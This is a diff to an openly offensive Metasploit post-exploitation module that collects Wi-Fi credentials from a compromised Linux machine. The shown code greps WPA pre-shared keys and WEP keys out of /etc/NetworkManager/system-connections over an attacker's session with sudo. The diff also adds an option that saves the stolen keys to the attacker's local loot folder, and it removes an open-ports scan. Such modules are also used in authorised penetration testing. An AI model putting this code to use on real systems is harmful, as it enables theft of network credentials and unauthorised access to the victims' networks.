@@ -14,16 +14,17 @@
 #
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
-# This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key
-# from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. This module
-# also gathers target open ports information (advanced option ) ..
+# This module collects 802-11-Wireless-Security credentials such as Access-Point name and
+# Pre-Shared-Key from your target Linux machine using /etc/NetworkManager/system-connections/
+# files. This module also stores the dump data into loot folder (advanced option).
 # HINT: this module requires root privileges to run in non-Kali distros ..
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on => set SESSION 3
-# Dump credentials of remote system?       => set DUMP_CREDS true
-# The default path for network connections => set REMOTE_DIR /etc/NetworkManager/system-connections
+# The session number to run this module on       => set SESSION 3
+# Dump credentials of remote system?             => set DUMP_CREDS true
+# Store dumps to loot file (.msf4/loot/file.txt) => set STORE_LOOT true
+# The default path for network connections       => set REMOTE_DIR /etc/NetworkManager/system-connections
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -68,7 +69,7 @@ require 'msf/core/post/common'
 # Metasploit Class name and includes
 #
 class MetasploitModule < Msf::Post
-      Rank = GreatRanking
+      Rank = ExcellentRanking
 
   include Msf::Post::File
   include Msf::Post::Linux::Priv
@@ -83,7 +84,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'ESSID credentials dump (wpa/wep)',
                         'Description'   => %q{
-                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. This module also gathers target open ports information (only servers).
+                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. This module also stores the dump data into loot folder (advanced option).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -91,8 +92,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
-                        'DisclosureDate' => 'jun 7 2017',
+                        'Version'        => '$Revision: 1.4',
+                        'DisclosureDate' => 'jun 8 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true',  # root privs required in non-Kali distros
@@ -123,6 +124,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptBool.new('STORE_LOOT', [false, 'Store dumps to loot file (file.txt)', false]),
                                 OptString.new('REMOTE_DIR', [ true, 'The default path for network connections'])
                         ], self.class)
  
@@ -145,7 +147,7 @@ def ls_stage1
     print_warning("Please set DUMP_CREDS option...")
     return nil
   else
-    print_status("Dumping remote credentials ..")
+    print_status("Dumping remote wpa/wep credentials ..")
     Rex::sleep(1.0)
   end
 
@@ -162,9 +164,12 @@ def ls_stage1
       #
       # Dump wifi credentials and network info from target system (wpa/wep)
       #
+      data_dump=''
       wpa_out = cmd_exec("sudo grep psk= #{rpath}/*")
       wep_out = cmd_exec("sudo grep wep-key0= #{rpath}/*")
-      open_ports = cmd_exec("/bin/netstat -tulpn")
+      # store data in variable
+      data_dump << wpa_out
+      data_dump << wep_out
       Rex::sleep(1.0)
 
         #
@@ -181,14 +186,15 @@ def ls_stage1
         print_line(wep_out)
         print_line("")
         Rex::sleep(0.5)
-        #
-        # Display target open ports ..
-        #
-        print_line("REMOTE OPEN PORTS:")
-        print_line("----------------")
-        print_line(open_ports)
-        print_line("")
-        Rex::sleep(0.5)
+
+    #
+    # Store data to msf loot folder (local) ..
+    #
+    if datastore['STORE_LOOT'] == true
+      print_warning("Credentials stored in: .msf4/loot (local folder) ..")
+      store_loot("wpa/wep_credentials", "text/plain", session, data_dump, "wpa/wep_dump.txt", "output of wpa/wep dump")
+    end
+
 
   #
   # error exception funtion
@@ -225,8 +231,8 @@ def run
     print_line("    Target Architecture : #{sysnfo['Architecture']}")
     print_line("    Computer            : #{sysnfo['Computer']}")
     print_line("    Target IP addr      : #{runsession}")
-    print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Payload directory   : #{directory}")
+    print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Client UID          : #{runtor}")
     print_line("")
     print_line("")
